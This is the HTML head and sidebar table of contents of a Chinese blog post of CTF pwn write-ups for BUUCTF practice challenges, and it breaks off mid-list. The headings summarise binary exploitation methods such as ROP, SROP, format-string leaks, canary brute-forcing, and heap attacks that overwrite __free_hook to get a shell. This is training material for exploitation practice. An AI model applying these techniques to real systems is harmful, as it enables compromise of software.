<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>CTF-BUUCTF-Pwn刷题之旅-(1) | 咲夜南梦's 博客</title><meta name="description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="keywords" content="CTF,Pwn"><meta name="author" content="咲夜南梦,196011564@qq.com"><meta name="copyright" content="咲夜南梦"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="twitter:description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta name="twitter:image" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/bg.png"><meta property="og:type" content="article"><meta property="og:title" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta property="og:url" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"><meta property="og:site_name" content="咲夜南梦's 博客"><meta property="og:description" content="CTF-BUUCTF-Pwn刷题之旅-(1)"><meta property="og:image" content="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/bg.png"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = '1'
var t = Cookies.get("theme")
if (autoChangeMode == '1'){
  const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
  const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
  const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
  const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined){
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport){
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      now = new Date();
      hour = now.getHours();
      isNight = hour < 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
  }
  } else if (t == 'light') activateLightMode()
  else activateDarkMode()

} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://yoursite.com/2019/07/13/CTF-BUUCTF-Pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85-(1)/"><link rel="prev" title="CTF-安恒杯-19年7月赛" href="http://yoursite.com/2019/07/15/CTF-%E5%AE%89%E6%81%92%E6%9D%AF-19%E5%B9%B47%E6%9C%88%E8%B5%9B/"><link rel="next" title="CTF-赛博杯CyberCTF-19年7月" href="http://yoursite.com/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5/js/md5.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  highlightCopy: true,
  highlightLang: true,
  highlightShrink: false,
  isFontAwesomeV5: false
  
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false
}</script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="咲夜南梦's 博客" type="application/atom+xml">
</head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">134</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">47</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">26</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> 额外功能</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 视频</span></a></li></ul></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-warmup-csaw-2016"><span class="toc-number">1.</span> <span class="toc-text">0x01 warmup_csaw_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-RIP覆盖一下"><span class="toc-number">2.</span> <span class="toc-text">0x02 RIP覆盖一下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-babyfengshui-33c3-2016"><span class="toc-number">3.</span> <span class="toc-text">0x03 babyfengshui_33c3_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-babyheap-0ctf-2017"><span class="toc-number">4.</span> <span class="toc-text">0x04 babyheap_0ctf_2017</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-get-started-3dsctf-2016"><span class="toc-number">5.</span> <span class="toc-text">0x05 get_started_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-not-the-same-3dsctf-2016"><span class="toc-number">6.</span> <span class="toc-text">0x06 not_the_same_3dsctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-bugbug-codegate-2016"><span class="toc-number">7.</span> <span class="toc-text">0x07 bugbug_codegate_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-ez-pz-hackover-2016"><span class="toc-number">8.</span> <span class="toc-text">0x08 ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-tiny-backdoor-v1-hackover-2016"><span class="toc-number">9.</span> <span class="toc-text">0x09 tiny_backdoor_v1_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-bbys-tu-2016"><span class="toc-number">10.</span> <span class="toc-text">0x10 bbys_tu_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11-oneshot-tjctf-2016"><span class="toc-number">11.</span> <span class="toc-text">0x11 oneshot_tjctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-pwn1-sctf-2016"><span class="toc-number">12.</span> <span class="toc-text">0x12 pwn1_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13-pwn2-sctf-2016"><span class="toc-number">13.</span> <span class="toc-text">0x13 pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14-ciscn-2019-c-1"><span class="toc-number">14.</span> <span class="toc-text">0x14 ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15-ciscn-2019-n-1"><span class="toc-number">15.</span> <span class="toc-text">0x15 ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16-ciscn-2019-n-8"><span class="toc-number">16.</span> <span class="toc-text">0x16 ciscn_2019_n_8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17-ciscn-2019-sw-7"><span class="toc-number">17.</span> <span class="toc-text">0x17 ciscn_2019_sw_7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18-espcially-tu-2016"><span class="toc-number">18.</span> <span class="toc-text">0x18 espcially_tu_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#解法一"><span class="toc-number">18.1.</span> <span class="toc-text">解法一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解法二"><span class="toc-number">18.2.</span> <span class="toc-text">解法二:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-ciscn-2019-en-2"><span class="toc-number">19.</span> <span class="toc-text">0x19 ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-ciscn-s-4"><span class="toc-number">20.</span> <span class="toc-text">0x20 ciscn_s_4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21-ciscn-2019-n-3"><span class="toc-number">21.</span> <span class="toc-text">0x21 ciscn_2019_n_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1、利用unsorted-bin-attack知道libc地址"><span class="toc-number">22.</span> <span class="toc-text">1、利用unsorted bin attack知道libc地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2、存在UAF漏洞，然后利用fastbin-attack，实现堆块重叠，且通过利用unsorted-bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串"><span class="toc-number">23.</span> <span class="toc-text">2、存在UAF漏洞，然后利用fastbin attack，实现堆块重叠，且通过利用unsorted bin在fd、bk不够放置时，一次性将剩余堆块全部申请回来的特性，使得可以填充进system地址和sh字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22-ciscn-s-8"><span class="toc-number">24.</span> <span class="toc-text">0x22 ciscn_s_8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload"><span class="toc-number">24.1.</span> <span class="toc-text">导入ida后，发现是一个异或算法，然后strcpy处存在栈溢出，但是会对输入的文本进行异或0x66的处理，我们可以预先先对payload异或0x66，然后在程序对它再次异或时就会复原回有攻击性的payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add-rax-1换成add-rax-3，缩短ROPchain，达成攻击。注意不换成add-rax-3会出现ROPchain被截断的情况"><span class="toc-number">24.2.</span> <span class="toc-text">另外这道题，我为了图方便，且程序是静态编译，ROPgadget往往是可以生成ROPchain的，可以考虑将add rax,1换成add rax,3，缩短ROPchain，达成攻击。注意不换成add rax,3会出现ROPchain被截断的情况</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23-ciscn-s-3"><span class="toc-number">25.</span> <span class="toc-text">0x23 ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gadget处可以赋值rax为15，恰好为SYS-SigReturnFrame"><span class="toc-number">25.1.</span> <span class="toc-text">gadget处可以赋值rax为15，恰好为SYS_SigReturnFrame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#那么思路如下"><span class="toc-number">25.2.</span> <span class="toc-text">那么思路如下:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、先leak-stack地址，然后顺带的传入-bin-sh-x00字符串，通过leak-stack来定位binsh的位置，再跳回SYS-read处"><span class="toc-number">25.3.</span> <span class="toc-text">1、先leak stack地址，然后顺带的传入&#x2F;bin&#x2F;sh\x00字符串，通过leak stack来定位binsh的位置，再跳回SYS_read处</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、赋值rax为15，跳到syscall上，成功popal-sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell"><span class="toc-number">25.4.</span> <span class="toc-text">2、赋值rax为15，跳到syscall上，成功popal sigframe，此时sigframe的数据由我们输入的数据控制，凑成可以拿shell的形式，即可拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x24-ciscn-2019-nw-6"><span class="toc-number">26.</span> <span class="toc-text">0x24 ciscn_2019_nw_6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序没有任何保护，考虑shellcode"><span class="toc-number">26.1.</span> <span class="toc-text">程序没有任何保护，考虑shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去"><span class="toc-number">26.2.</span> <span class="toc-text">利用栈内两个栈空间的指针来改写ret地址，然后顺便最后写入shellcode到bss，然后ret跳过去</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x25-judgement-mna-2016"><span class="toc-number">27.</span> <span class="toc-text">0x25 judgement_mna_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本"><span class="toc-number">27.1.</span> <span class="toc-text">导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x26-ciscn-nw-4"><span class="toc-number">28.</span> <span class="toc-text">0x26 ciscn_nw_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc"><span class="toc-number">28.1.</span> <span class="toc-text">1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、通过fastbin-attack修改unsorted-bin’s-bk，在-free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改-free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可"><span class="toc-number">28.2.</span> <span class="toc-text">2、通过fastbin attack修改unsorted bin’s bk，在__free_hook处伪造fake_chunk，然后再用double free fastbin attack修改__free_hook的值为system，然后释放content为&#x2F;bin&#x2F;sh\x00的chunk即可</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃"><span class="toc-number">28.3.</span> <span class="toc-text">最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub rsp,0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x27-checker-seccon-2016"><span class="toc-number">29.</span> <span class="toc-text">0x27 checker_seccon_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#首先这题开启了canary，且代码无法leak-canary，导致无法溢出"><span class="toc-number">29.1.</span> <span class="toc-text">首先这题开启了canary，且代码无法leak canary，导致无法溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据"><span class="toc-number">29.2.</span> <span class="toc-text">考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60"><span class="toc-number">29.3.</span> <span class="toc-text">由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可"><span class="toc-number">29.4.</span> <span class="toc-text">如何找到argv[0]，只需调试器附加运行的程序，然后找到.&#x2F;文件名的字符串即可，比如我这里是.&#x2F;checker_seccon_2016，然后将flag的地址覆盖进去即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x28-ciscn-2019-ne-5"><span class="toc-number">30.</span> <span class="toc-text">0x28 ciscn_2019_ne_5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的ROP题，ret2text"><span class="toc-number">30.1.</span> <span class="toc-text">典型的ROP题，ret2text</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x29-ciscn-2019-es-2"><span class="toc-number">31.</span> <span class="toc-text">0x29 ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-ciscn-2019-final-3"><span class="toc-number">32.</span> <span class="toc-text">0x30 ciscn_2019_final_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell"><span class="toc-number">32.1.</span> <span class="toc-text">这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell"><span class="toc-number">32.2.</span> <span class="toc-text">简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x31-ciscn-2019-en-3"><span class="toc-number">33.</span> <span class="toc-text">0x31 ciscn_2019_en_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x32-ciscn-2019-c-5"><span class="toc-number">34.</span> <span class="toc-text">0x32 ciscn_2019_c_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x33-ciscn-2019-es-4"><span class="toc-number">35.</span> <span class="toc-text">0x33 ciscn_2019_es_4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#可以考虑用unlink来获得对chunk-list控制"><span class="toc-number">35.1.</span> <span class="toc-text">可以考虑用unlink来获得对chunk_list控制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。"><span class="toc-number">35.2.</span> <span class="toc-text">将unlink攻击的堆块放到第32个位置，使得edit时可以改变key1和key2的值，进行解锁功能。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如果完成以上两行的攻击后，接下来只需要got-leak，然后libc-leak，然后写-free-hook为system即可"><span class="toc-number">35.3.</span> <span class="toc-text">如果完成以上两行的攻击后，接下来只需要got leak，然后libc leak，然后写__free_hook为system即可</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x34-ciscn-2019-es-1"><span class="toc-number">36.</span> <span class="toc-text">0x34 ciscn_2019_es_1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#由于题目要求是2-29，但是环境是2-23，所以解法会有较大差别，但是按环境为主"><span class="toc-number">36.1.</span> <span class="toc-text">由于题目要求是2.29，但是环境是2.23，所以解法会有较大差别，但是按环境为主</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted-bin-attack和fastbin-attack的组合式攻击"><span class="toc-number">36.2.</span> <span class="toc-text">由于只能申请12个堆块，而且一次add会申请两个堆块，对我们的堆块利用会造成干扰，所以我们需要在最后一次add的时候，同时完成unsorted bin attack和fastbin attack的组合式攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、leak-libc和heap-base这个攻击手法就不用多说了"><span class="toc-number">36.3.</span> <span class="toc-text">1、leak libc和heap_base这个攻击手法就不用多说了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、先两次double-free和fastbin-attack把被攻击堆块放入bins中，然后修改unsorted-bin的bk，使得-free-hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc-0x18-完成unsorted-bin-attack，写入大数，然后同时malloc-0x68-fastbin-attack，覆盖-free-hook为system"><span class="toc-number">36.4.</span> <span class="toc-text">2、先两次double free和fastbin attack把被攻击堆块放入bins中，然后修改unsorted bin的bk，使得__free_hook的低位地址写入0x7f开头的大数，然后在最后一次add，通过malloc(0x18)完成unsorted bin attack，写入大数，然后同时malloc(0x68)fastbin attack，覆盖__free_hook为system</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#然后free一个内容为-bin-sh-x00的堆块即可，推荐使用double-free之后，第二次add的堆块的内容设置为-bin-sh-x00"><span class="toc-number">36.5.</span> <span class="toc-text">然后free一个内容为&#x2F;bin&#x2F;sh\x00的堆块即可，推荐使用double free之后，第二次add的堆块的内容设置为&#x2F;bin&#x2F;sh\x00</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x35-ciscn-2019-sw-6"><span class="toc-number">37.</span> <span class="toc-text">0x35 ciscn_2019_sw_6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简单看一下程序的功能，发现是归并排序，然后会输出逆序数"><span class="toc-number">37.1.</span> <span class="toc-text">简单看一下程序的功能，发现是归并排序，然后会输出逆序数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak-canary"><span class="toc-number">37.2.</span> <span class="toc-text">漏洞在输入数组的时候，可以无限输入，所以可以考虑利用ROPgadget构造ROP链，但是开启了canary，需要leak canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击"><span class="toc-number">37.3.</span> <span class="toc-text">考虑到canary末尾两位为0，所以只需要爆破6位即可，想了一下程序只能输出逆序数，所以可以利用逆序数的特点进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间"><span class="toc-number">37.4.</span> <span class="toc-text">1、输入一串有序数列，然后在canary的上方输入0，即可开始排序，由于我们输入的是一个有序数列，然后末尾为0和canary，进行排序之后输出的逆序数，可以让我们定位canary的区间</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为-0xFFFFFFFF-0x10000000-299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级"><span class="toc-number">37.5.</span> <span class="toc-text">2、有数列一开始根据0x10000000-0xFFFFFFFF，由于有299个数量（因为301是canary，300是0用于停止输入），所以一个区间大小为(0xFFFFFFFF - 0x10000000) &#x2F; 299，由于canary十分大，所以误差可以忽略不计，一次定位可以缩小三个数量级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了"><span class="toc-number">37.6.</span> <span class="toc-text">3、一次定位可以确定第一位的大小，二次定位可以确定前4位的大小，第三次定位可以唯一确定一个canary或两个canary，多跑几次就好了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell"><span class="toc-number">37.7.</span> <span class="toc-text">4、跑出canary之后，利用ROPgadget生成ROP链，然后覆盖eip即可拿到shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200-，且50-的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200-次，哈哈哈，没事本地拿到shell就好了，说明思路没有错"><span class="toc-number">37.8.</span> <span class="toc-text">但是buuoj的交互好像有一定的限制，导致我交互到60多次就EOF了，而拿到shell需要交互1200+，且50%的概率。buuoj两分钟重置一次环境，我觉得2分钟好像跑不完1200+次，哈哈哈，没事本地拿到shell就好了，说明思路没有错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#这里介绍一个jly大师傅的解法，scanf-ud-，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅"><span class="toc-number">37.9.</span> <span class="toc-text">这里介绍一个jly大师傅的解法，scanf(&quot;%ud&quot;)，如果输入带符号的数，则不会改变欲写入地址的数据，就可以越过canary直接写ropchain，这不得不膜一下jly师傅</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x36-ping-gnop-hackover-2016"><span class="toc-number">38.</span> <span class="toc-text">0x36 ping_gnop_hackover_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#我将这题称为ROPgadget-ropchain人工版"><span class="toc-number">38.1.</span> <span class="toc-text">我将这题称为ROPgadget --ropchain人工版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int-0x80拿到shell"><span class="toc-number">38.2.</span> <span class="toc-text">题目中存在过滤字符，所以要一个一个尝试gadget，然后再利用可用的gadget构造ROP链，最后通过int 0x80拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x37-warmup"><span class="toc-number">39.</span> <span class="toc-text">0x37 warmup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell"><span class="toc-number">39.1.</span> <span class="toc-text">这题要配好各个寄存器参数，然后利用read将读入字符数写入eax，从而将函数序列号变成execve的序列号，然后再确保寄存器内的指针都是正确的，即可拿到shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x38-fixedpoint-plaid-2016"><span class="toc-number">40.</span> <span class="toc-text">0x38 fixedpoint_plaid_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#这题就是典型的shellcode，找数字吧小伙子"><span class="toc-number">40.1.</span> <span class="toc-text">这题就是典型的shellcode，找数字吧小伙子~~</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x39-ciscn-2019-final-2"><span class="toc-number">41.</span> <span class="toc-text">0x39 ciscn_2019_final_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"><span class="toc-number">41.1.</span> <span 